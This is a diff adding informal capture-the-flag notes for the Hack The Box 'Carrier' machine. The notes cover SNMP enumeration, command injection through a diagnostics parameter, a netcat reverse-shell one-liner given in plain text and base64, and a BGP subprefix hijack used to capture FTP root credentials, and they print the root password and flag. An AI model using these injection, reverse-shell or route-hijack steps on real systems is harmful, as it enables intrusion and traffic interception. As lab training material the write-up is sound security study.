@@ -1,0 +1,64 @@
+HTB CARRIER
+1)Do a full port scan TCP and UDP
+2)Found login page whic contains some codes about errors saying password its the chassis number
+3)got port 161 running snmp
+4)use snmpwalk -v 1 -c public 10.10.10.105
+5) got the number SN#NET_45JDX23
+6)Login with user admin and the pass
+Notice the tickets area with useful info normally unresolved issues are vulns.
+7)Notice the diagnostics verify status
+8)capture the request with burp and notice check= parameter it ask for ps aux | grep quagga
+9)the commands must be encoded in base 64 to work
+9)so we can chain another command to it like nc but /bin/sh its giving us problems so we specify /bin/bash
+quagga; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.x.x 4444 >/tmp/f
+in base64 encoded:
+cXVhZ2dhOyBybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vYmFzaCAtaSAyPiYxfG5jIDEwLjEwLjE1LjEzNCA0NDQ0ID4vdG1wL2Y=0)
+10)get user flag
+Previusly with gobuster we manage to find a diagram with the servers that linked with quagga.
+11) find the routes and from hint in login pages tickets we get:
+"one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network", and after flushing the iptables rules and just doing a ping sweep I found 10.120.15.1 and 10.120.15.10.encoded in base 64:
+ 
+12)10.120.15.10 has an FTP server, .1 does not. So I'm pretty sure 10.120.15.10 is the FTP server.
+ 
+I also tried injecting a network in bgpd.conf, namely:
+ 
+"network 10.120.15.0/21"
+ 
+Then systemctrl restart quagga.
+ 
+I then tried to sniff with tcpdump on eth1.
+ 
+Why eth1? Because from the diagram (diagram_for_tac.png) and a lot of network enumeration it seems:
+We cab upload a nmap binary to scan for network in local.
+The box you get a shell on is AS100.
+The "important FTP server" is connected to AS300.
+AS100 is connected to both AS200 and AS300.
+Connections to the FTP server are probably originating from AS200. To reach 10.120.15.10 it need to go through AS300, we want it to go through us instead by claiming we have this prefix connected to us even when we don't.
+ 
+We receive traffic from AS200 on eth1, so eth1 it is.
+ 
+I didn't get anything though.
+ 
+But this would be just a prefix hijack, the ASPATH is just as long both going through us (AS100) as through AS300. Hence a subprefix hijack attack is needed, I think?
+ 
+In a subprefix hijack we need to announce a new prefix, i.e. a longer prefix, from what I understand from doing some reading. That means ... a more specific subnet?
+ 
+the FTP server is at 10.120.15.10, you need to configure eth2 up as that IP, and you need to inject a network with a long prefix, such as 10.120.15.8/29 into the bgpd.conf, .8 because the subnetmask only allows for a few hosts, and we want it to overlap with .10.
+ 
+Try that, and be aware of that pesky script under /opt which resets the whole thing, I just gave it a .bak extension to prevent the thing from running.
+ 
+Then you should start getting FTP traffic.
+ 
+so I set the eth2 adapter to 10.120.15.10 netmask 255.255.255.0 and added network 10.120.15.8/29 to the bgpd.conf file and changed the restore.sh to restore.sh.bak
+restart the quagga service
+Then start up nc and bind it to that IP and listen for incoming FTP:
+Alternate we can use ftpd.py and upload to the machine.
+when it connects throw a 220 FTP response and then a 331 FTP response and it will get you the root credentials for you to ssh.
+13)credentials are:
+                        root:BGPtelc0rout1ng
+ 
+14)now login through ssh with new credentials ----->>> ssh root@10.10.10.105
+15)get root flag and secret
+Root flag: 2832e552061532250ac2a21478fd4866
+ 
+*********************************************
